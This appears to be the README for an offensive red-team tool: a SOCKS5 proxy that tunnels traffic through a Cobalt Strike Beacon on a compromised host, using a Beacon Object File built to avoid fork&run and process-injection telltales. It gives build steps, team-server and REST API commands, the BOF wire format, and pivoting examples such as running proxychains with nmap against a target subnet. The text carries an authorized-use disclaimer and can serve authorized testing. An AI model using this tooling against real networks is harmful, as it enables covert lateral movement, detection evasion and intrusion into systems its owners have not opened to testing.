# socks5 task pump

A SOCKS5 proxy whose listener runs on the Cobalt Strike **client** and whose
target sockets live inside a **Beacon Object File**.  There is no
`CreateThread`, `CreateProcess`, fork&run, or process injection anywhere in the
chain.  Every byte moves through normal Beacon tasking.

```
   operator tool (proxychains, browser, ...)
            |
            v
   socks5_orchestrator.py          <-- SOCKS5 listener, client machine
            |  HTTPS + JWT
            v
   csrestapi / team server  ==== Beacon C2 ====> target Beacon
                                                    |
                                                    +--> target:port
```

## Setup

Start the team server with `--experimental-db` (required by the REST API):

```sh
./teamserver <TEAM_BIND_IP> '<TEAMSERVER_PASSWORD>' <CS_PROFILE> <PROFILE_DATE> --experimental-db
```

Start `csrestapi` on the team server. `--port` is the team server port
(`50050`); the REST HTTPS port comes from `application.properties`.

```sh
cd <CS_ROOT>/server/rest-server
./csrestapi --pass '<TEAMSERVER_PASSWORD>' --user <REST_USER> \
  --host 127.0.0.1 --port 50050
```

## Why this shape

A BOF executes synchronously on Beacon's task thread and its image is unloaded
when `go()` returns, so a BOF cannot host a long-running SOCKS5 listener by
itself.  The built-in `socks` command keeps the listener on the team server and
turns each connection into connect/read/write tasks, but it does so with the
fork&run machinery this project wants to avoid.

This project keeps the same task-pump idea, but:

* the listener is on the client, so no new listener is exposed on the
  team server;
* the target sockets are created by the BOF in the Beacon process and stay
  open between BOF invocations;
* the BOF state table is heap-allocated and persisted with
  `BeaconAddValue`/`BeaconGetValue`, because the BOF image itself is freed;
* each operation is a short, bounded, non-blocking `select()`/`recv()`/`send()`
  call, so one invocation never parks the Beacon task thread for long.

The cost is latency and throughput: one BOF task per chunk, bounded by the
Beacon sleep interval and by the REST polling interval.  Use a short sleep and
large chunks for interactive work; expect poor performance for bulk transfer.

## Requirements

* Cobalt Strike 4.12+ (REST API, `/api/v1/beacons/{bid}/execute/bof/pack`).
* Team Server started with `--experimental-db`, and `csrestapi` running.
* A BOF compiled for the target Beacon's architecture (`beaconArch`).
* Python 3.9+ on the client machine (standard library only).

## Build

```sh
make            # socks5.x64.o
make x86        # socks5.x86.o (needs i686-w64-mingw32-gcc)
```

The x64 object imports only `Beacon*`, `KERNEL32$*`, `MSVCRT$*`, and
`WS2_32$*`; verify with `nm -u socks5.x64.o`.

### Linux build

The BOF is cross-compiled with MinGW. On Debian/Ubuntu:

```sh
sudo apt update
sudo apt install -y build-essential mingw-w64 python3
make
```

On Fedora/RHEL use `sudo dnf install -y make gcc mingw64-gcc python3`.

The orchestrator and picker are pure Python 3.9+; use `python3` instead of
`python` when running them on Linux. Arrow-key input supports both CSI
(`ESC [ A`) and SS3 (`ESC O A`) sequences. See `SETUP.md` sections 2.1 and 5.2
for the full Linux workflow.

## Run

```sh
python socks5_orchestrator.py \
  --rest-url https://127.0.0.1:50443 \
  --user <REST_USER> \
  --password '<TEAMSERVER_PASSWORD>' \
  --bid <BEACON_ID> \
  --listen 127.0.0.1 --port 1080 \
  --insecure
```

`--bid` may be omitted when exactly one live Beacon exists.  The orchestrator
selects `socks5.x86.o`/`socks5.x64.o` from the Beacon's `beaconArch`.

### Interactive picker

```sh
python socks5_interactive.py \
  --rest-url https://127.0.0.1:50443 \
  --user <REST_USER> --password '<TEAMSERVER_PASSWORD>' \
  --insecure
```

Use the arrow keys to select a Beacon, `Enter` to start or switch, `s` to stop,
`r` to refresh, and `q` to quit. The Beacon list refreshes every second in a
background thread; start/stop/switch run in a worker thread so the menu stays
responsive.

Useful flags:

| Flag | Meaning |
| --- | --- |
| `--read-timeout-ms` | How long each READ task waits for target data (default 500). This is the main latency knob. |
| `--connect-timeout-ms` | CONNECT task timeout (default 4000). |
| `--task-timeout` | Seconds to wait for one REST task result (default 180). |
| `--bof @files/...` | Use a BOF already on the REST server instead of uploading the local object inline. |
| `--max-clients` | Concurrent SOCKS clients (default and maximum 16, the BOF stream limit). |
| `--idle-poll-ms` | Pause after an empty READ before polling again (default 100). |
| `--drain-timeout` | Seconds to keep forwarding client data after target EOF (default 5). |
| `--reset` | Send RESET (close every BOF-held socket) and exit. |
| `--reset-on-start` / `--reset-on-exit` | Clean stale streams automatically. |
| `--verbose` | Log SOCKS activity and raw BOF output to stderr. |

Point the tool at the proxy, e.g.:

```sh
curl --socks5-hostname 127.0.0.1:1080 http://<TARGET_IP>/
proxychains4 -q nmap -sT -Pn <TARGET_SUBNET>
```

## BOF wire format

Request (20-byte header, network byte order):

```
u32 magic        0x53355231 ("S5R1")
u32 op           CONNECT(1) READ(2) WRITE(3) CLOSE(4) PING(5) RESET(6)
u32 stream_id
u32 timeout_ms   0 = operation default
u32 payload_len
u8  payload[]
```

* CONNECT: `u16 port_be | host bytes`
* READ:    `u32 max_bytes` (optional; 0 or >8192 means 8192)
* WRITE:   raw bytes
* CLOSE/RESET/PING: empty

Result (text, written with `BeaconOutput`):

```
S5R <stream_id> <status> <error> <hex-data>\n
```

`status`: `0=OK 1=AGAIN 2=EOF 3=ERROR 4=BAD_REQUEST`.
`error` is the Winsock error code where applicable.  Data is hex encoded so
the Beacon output path never mangles binary.

## Limits

* `MAX_STREAMS` = 16 (one target socket per stream; raise and rebuild if
  needed).
* `MAX_CHUNK` = 8192 bytes per READ/WRITE task.
* Sockets and state die if the Beacon process exits; use `--reset` to clean up
  stale state after a reconnect.
* The orchestrator serializes BOF tasks per Beacon, so concurrent SOCKS
  clients share the Beacon task queue.  This is inherent to the task-pump
  design.  `--idle-poll-ms` trades latency against task volume.
* The REST client re-authenticates once on HTTP 401.  A task whose result is
  lost (Beacon dies mid-operation) must be cleaned up with `--reset`.
* `csrestapi` must be able to read the BOF.  The orchestrator sends the object
  inline as `@files/socks5.x64.o` with a base64 `files` map, so no server-side
  upload is required.

## Manual testing from Aggressor

`socks5.cna` provides `socks5_ping`, `socks5_reset`, `socks5_close`, and
`socks5_run <bid> <op> <stream_id> <hex-payload> [timeout_ms]`.  For example,
connect to `example.com:80` on stream 1:

```
socks5_run <BEACON_ID> 1 1 00506578616d706c652e636f6d
```

Then read:

```
socks5_run <BEACON_ID> 2 1 ""
```

The result appears in the Beacon console as `S5R 1 0 0 <hex>`.

## Authorized use

This project is intended for authorized security testing, lab environments,
and research. Do not use it against systems you do not own or have explicit
permission to test. The authors are not responsible for misuse.
